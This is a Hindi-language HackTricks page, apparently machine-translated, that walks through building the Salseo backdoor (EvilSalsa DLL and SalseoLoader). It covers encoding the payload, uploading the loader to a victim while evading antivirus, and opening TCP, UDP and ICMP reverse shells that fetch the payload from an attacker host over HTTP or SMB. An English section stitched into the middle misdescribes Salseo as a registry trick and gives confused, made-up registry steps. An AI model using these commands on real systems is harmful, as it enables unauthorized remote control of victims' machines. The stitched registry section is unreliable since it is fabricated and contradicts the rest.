# सालसेओ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**

</details>

## बाइनरी को कंपाइल करें

गिथब से स्रोत कोड डाउनलोड करें और **EvilSalsa** और **SalseoLoader** को कंपाइल करें। कोड को कंपाइल करने के लिए आपको **Visual Studio** इंस्टॉल करने की आवश्यकता होगी।

इन प्रोजेक्ट्स को उस विंडोज बॉक्स के लिए कंपाइल करें जहां आप उन्हें उपयोग करने जा रहे हैं (यदि Windows x64 को समर्थन करता है, तो उन्हें उस आर्किटेक्चर के लिए कंपाइल करें)।

आप विजुअल स्टूडियो के अंदर आर्किटेक्चर को चुन सकते हैं विंडोज के बाएं "बिल्ड" टैब में "प्लेटफ़ॉर्म टारगेट" में।

(\*\*यदि आप इस विकल्प को नहीं ढूंढ सकते हैं, तो "प्रोजेक्ट टैब" में जाएं और फिर "आपूर्ति नाम" में जाएं)

![](<../.gitbook/assets/image (132).png>)

फिर, दोनों प्रोजेक्ट्स को बिल्ड करें (बिल्ड -> समाधान बिल्ड करें) (लॉग्स के अंदर निष्पादनी के पथ दिखाई देगा):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## बैकडोर को तैयार करें

सबसे पहले, आपको **EvilSalsa.dll** को एनकोड करने की आवश्यकता होगी। इसके लिए, आप **encrypterassembly.py** पायथन स्क्रिप्ट का उपयोग कर सकते हैं या आप प्रोजेक्ट **EncrypterAssembly** को कंपाइल कर सकते हैं:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

#### Salseo

Salseo is a backdoor technique used to gain unauthorized access to a Windows system. It involves modifying the Windows registry to create a new user account with administrative privileges. This backdoor can be used to maintain persistent access to the system and carry out malicious activities.

##### Steps to Perform Salseo

1. Open the Windows registry editor by typing `regedit` in the Run dialog box (Win + R).

2. Navigate to the following registry key: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList`.

3. Create a new DWORD value with the name of the user account you want to create. Set the value to `0` to hide the account from the Windows login screen or `1` to display it.

4. Navigate to the following registry key: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList`.

5. Create a new key with the name of the user account you want to create.

6. Inside the new key, create a new string value named `UserPassword` and set it to the desired password for the user account.

7. Restart the system for the changes to take effect.

##### Mitigation

To mitigate the Salseo backdoor technique, it is recommended to regularly monitor the Windows registry for any unauthorized modifications. Additionally, strong password policies and user access controls should be implemented to prevent unauthorized account creation. Regular security updates and patches should also be applied to the Windows system to address any vulnerabilities that could be exploited by this technique.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
ठीक है, अब आपके पास सभी चीजें हैं जो आपको सालसेओ कार्य को कार्यान्वित करने के लिए चाहिए हैं: **एनकोडेड EvilDalsa.dll** और **SalseoLoader का बाइनरी।**

**मशीन पर SalseoLoader.exe बाइनरी अपलोड करें। इसे कोई भी AV द्वारा पहचाना नहीं जाना चाहिए...**

## **बैकडोर को कार्यान्वित करें**

### **TCP रिवर्स शेल प्राप्त करना (HTTP के माध्यम से एनकोडेड dll को डाउनलोड करना)**

याद रखें कि रिवर्स शेल सुनने वाले एनसी को शुरू करें और एक HTTP सर्वर शुरू करें जो एनकोडेड evilsalsa को सेव करेगा।
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **एक UDP रिवर्स शेल प्राप्त करना (SMB के माध्यम से एनकोड किए गए dll को डाउनलोड करना)**

याद रखें कि रिवर्स शेल सुनने वाले एनसी को शुरू करने और एनकोड evilsalsa को सेव करने के लिए एक SMB सर्वर (impacket-smbserver) चालू करें।
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **एक ICMP रिवर्स शेल प्राप्त करना (पीडीएल इम्प्रिंटेड डीएल विक्टिम के अंदर)**

**इस बार आपको रिवर्स शेल प्राप्त करने के लिए क्लाइंट में एक विशेष उपकरण की आवश्यकता होगी। डाउनलोड करें:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP जवाब अक्षम करें:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### क्लाइंट को निष्पादित करें:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### पीड़ित के अंदर, हम सलसेओ चीज़ को निष्पादित करें:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## SalseoLoader को DLL के रूप में मुख्य फ़ंक्शन के निर्यात के रूप में कंपाइल करें

Visual Studio का उपयोग करके SalseoLoader परियोजना खोलें।

### मुख्य फ़ंक्शन के पहले जोड़ें: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### इस परियोजना के लिए DllExport इंस्टॉल करें

#### **उपकरण** --> **NuGet पैकेज प्रबंधक** --> **समाधान के लिए NuGet पैकेज प्रबंधन करें...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExport पैकेज के लिए खोजें (ब्राउज़ टैब का उपयोग करके) और स्थापित करें (और पॉपअप स्वीकार करें)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)

आपके परियोजना फ़ोल्डर में निम्नलिखित फ़ाइलें दिखाई देंगी: **DllExport.bat** और **DllExport\_Configure.bat**

### DllExport को अनइंस्टॉल करें

**अनइंस्टॉल** दबाएं (हाँ, यह अजीब है, लेकिन मुझ पर भरोसा करें, यह आवश्यक है)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### Visual Studio बंद करें और DllExport\_configure को चलाएं

बस Visual Studio **बंद** करें

फिर, अपने **SalseoLoader फ़ोल्डर** में जाएं और **DllExport\_Configure.bat** को **चलाएं**

**x64** का चयन करें (यदि आप इसे x64 बॉक्स के अंदर उपयोग करने जा रहे हैं, वह मेरा मामला था), **System.Runtime.InteropServices** का चयन करें (DllExport के लिए **Namespace** के अंदर) और **Apply** दबाएं

![](<../.gitbook/assets/image (7) (1) (1) (1).png>)

### परियोजना को फिर से Visual Studio के साथ खोलें

**\[DllExport]** अब और त्रुटि के रूप में नहीं चिह्नित होना चाहिए

![](<../.gitbook/assets/image (8) (1).png>)

### समाधान को बिल्ड करें

**आउटपुट प्रकार = कक्षा पुस्तकालय** का चयन करें (परियोजना --> SalseoLoader गुण --> अनुप्रयोग --> आउटपुट प्रकार = कक्षा पुस्तकालय)

![](<../.gitbook/assets/image (10) (1).png>)

**x64** **प्लेटफ़ॉर्म** का चयन करें (परियोजना --> SalseoLoader गुण --> बिल्ड --> प्लेटफ़ॉर्म लक्ष्य = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

समाधान को **बिल्ड** करने के लिए: बिल्ड --> समाधान बिल्ड करें (नई DLL का पथ आउटपुट कंसोल में दिखाई देगा)

### उत्पन्न Dll का परीक्षण करें

उस स्थान पर Dll की प्रतिलिपि बनाएं और पेस्ट करें जहां आप इसे परीक्षण करना चाहते हैं।

चलाएं:
```
rundll32.exe SalseoLoader.dll,main
```
यदि कोई त्रुटि प्रदर्शित नहीं होती है, तो संभवतः आपके पास एक कार्यात्मक DLL है !!

## DLL का उपयोग करके शैल प्राप्त करें

एक **HTTP** **सर्वर** का उपयोग करना न भूलें और एक **nc** **सुनने वाला** सेट करें

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) एक Windows ऑपरेटिंग सिस्टम प्रोग्राम है जिसका उपयोग कमांड लाइन इंटरफेस के माध्यम से किया जाता है। CMD का उपयोग विभिन्न कमांडों को चलाने, फ़ाइलों और फ़ोल्डरों को प्रबंधित करने, नेटवर्क संबंधित कार्यों को करने, और अन्य विभिन्न सिस्टम कार्यों को करने के लिए किया जाता है। CMD के माध्यम से आप बैच स्क्रिप्ट चला सकते हैं, जिससे आप एक साथ कई कमांडों को चला सकते हैं।

CMD के कुछ महत्वपूर्ण कमांडों में शामिल हैं:
- `dir`: वर्तमान डायरेक्टरी में उपलब्ध फ़ाइलों और फ़ोल्डरों की सूची देता है।
- `cd`: डायरेक्टरी बदलने के लिए उपयोग किया जाता है।
- `copy`: फ़ाइलों और फ़ोल्डरों की प्रतिलिपि बनाने के लिए उपयोग किया जाता है।
- `del`: फ़ाइलों और फ़ोल्डरों को हटाने के लिए उपयोग किया जाता है।
- `ipconfig`: नेटवर्क कन्फ़िगरेशन जानकारी प्रदान करता है।
- `ping`: नेटवर्क कनेक्शन की जांच करने के लिए उपयोग किया जाता है।

CMD का उपयोग करके आप अपने सिस्टम को और अधिक नियंत्रित कर सकते हैं और विभिन्न टास्कों को आसानी से पूरा कर सकते हैं।
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके साझा करें।**

</details>
